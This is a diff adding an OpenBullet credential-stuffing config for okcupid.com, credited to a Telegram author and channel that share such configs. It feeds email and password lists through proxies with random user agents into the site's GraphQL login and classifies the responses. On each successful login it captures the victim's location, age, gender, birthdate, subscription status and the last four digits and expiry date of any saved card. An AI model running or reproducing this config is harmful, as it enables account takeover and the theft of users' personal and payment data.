@@ -1,0 +1,160 @@
+[SETTINGS]
+{
+  "Name": "okcupid.com",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-22T18:46:05.267096+08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#Get REQUEST GET "https://www.okcupid.com/login" 
+  
+  HEADER "Host: www.okcupid.com" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#Login REQUEST POST "https://www.okcupid.com/graphql" 
+  CONTENT "{\"operationName\":\"authUserLoginWithEmail\",\"variables\":{\"input\":{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"deviceId\":\"\",\"forceCaptcha\":false}},\"query\":\"mutation authUserLoginWithEmail($input: AuthUserLoginWithEmailInput!) {\\\\n  authUserLoginWithEmail(input: $input) {\\\\n    userid\\\\n    statusCode\\\\n    reenableAuthCode\\\\n    reenableUserid\\\\n    onboardingIncomplete\\\\n    __typename\\\\n  }\\\\n}\\\\n\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.okcupid.com" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Tracestate: userid=" 
+  HEADER "X-Okcupid-Locale: en" 
+  HEADER "X-Okcupid-Platform: DESKTOP" 
+  HEADER "X-Okcupid-Version: 1" 
+  HEADER "Origin: https://www.okcupid.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://www.okcupid.com/login" 
+  HEADER "Te: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "statusCode\":0" 
+  KEYCHAIN Failure OR 
+    KEY "statusCode\":105" 
+    KEY "statusCode\":105" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "statusCode\":150" 
+    KEY "statusCode\":151" 
+    KEY "statusCode\":152" 
+    KEY "statusCode\":108" 
+    KEY "statusCode\":107" 
+    KEY "statusCode\":145" 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "statusCode" 
+
+#Get REQUEST GET "https://www.okcupid.com/1/apitun/okc/user_bootstrap" 
+  
+  HEADER "Host: okcupid.com" 
+  HEADER "accept: application/json" 
+  HEADER "user-agent: <UA>" 
+  HEADER "x-emb-path: /graphql/LoginWithEmail" 
+  HEADER "accept-encoding: gzip" 
+
+#zipCode PARSE "<SOURCE>" JSON "context.kruxData.zip" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "zipCode" 
+
+#g PARSE "<SOURCE>" JSON "context.kruxData.gender" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "g" 
+
+#gender FUNCTION Translate 
+  KEY "m" VALUE "Male" 
+  KEY "f" VALUE "Female" 
+  "<g>" -> CAP "gender" 
+
+#state PARSE "<SOURCE>" JSON "context.kruxData.state" CreateEmpty=FALSE -> CAP "state" 
+
+#age PARSE "<SOURCE>" JSON "context.kruxData.age" CreateEmpty=FALSE -> CAP "age" 
+
+#displayname PARSE "<SOURCE>" JSON "context.displayname" CreateEmpty=FALSE -> CAP "displayname" 
+
+#birthdate PARSE "<SOURCE>" JSON "context.user_demo.birthdate" JTokenParsing=TRUE -> VAR "birthdate" 
+
+#dob FUNCTION UnixTimeToDate "yyyy-MM-dd" "<birthdate>" -> CAP "dob" 
+
+#Get REQUEST GET "https://www.okcupid.com/1/apitun/settings/params" 
+  
+  HEADER "Host: okcupid.com" 
+  HEADER "accept: application/json" 
+  HEADER "user-agent: <UA>" 
+  HEADER "x-emb-path: /graphql/LoginWithEmail" 
+  HEADER "accept-encoding: gzip" 
+
+#hasPremium PARSE "<SOURCE>" JSON "settings.subscriptions.alist.hasPremium" JTokenParsing=TRUE -> VAR "hasPremium" 
+
+#paid FUNCTION Translate 
+  KEY "False" VALUE "No" 
+  KEY "True" VALUE "Yes" 
+  "<hasPremium>" -> CAP "paid" 
+
+#hasCreditCard PARSE "<SOURCE>" JSON "settings.hasCreditCard" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "hasCreditCard" 
+
+IF "<hasCreditCard>" Contains "True"
+
+#expiration PARSE "<SOURCE>" JSON "settings.creditCard.info.expiration" JTokenParsing=TRUE -> VAR "expiration" 
+
+#lastFour PARSE "<SOURCE>" JSON "settings.creditCard.info.lastFour" JTokenParsing=TRUE -> VAR "lastFour" "**** **** **** " "" 
+
+#card FUNCTION Constant "cardNumber: <lastFour> cardexpire: <expiration>" -> CAP "card" 
+
+ENDIF
+
+#isSubscriptionActive PARSE "<SOURCE>" JSON "settings.subscriptions.alist.isSubscriptionActive" JTokenParsing=TRUE -> VAR "isSubscriptionActive" 
+
+IF "<isSubscriptionActive>" Contains "True"
+
+#planExpire PARSE "<SOURCE>" JSON "settings.subscriptions.alist.expiration" JTokenParsing=TRUE -> VAR "planExpire" 
+
+#PlanExpireDate FUNCTION UnixTimeToDate "yyyy-MM-dd" "<planExpire>" -> CAP "PlanExpireDate" 
+
+#Time FUNCTION CurrentUnixTime -> VAR "Time" 
+
+#compute FUNCTION Compute "(<planExpire>-<Time>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+ENDIF
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBullet_CFGs"
+
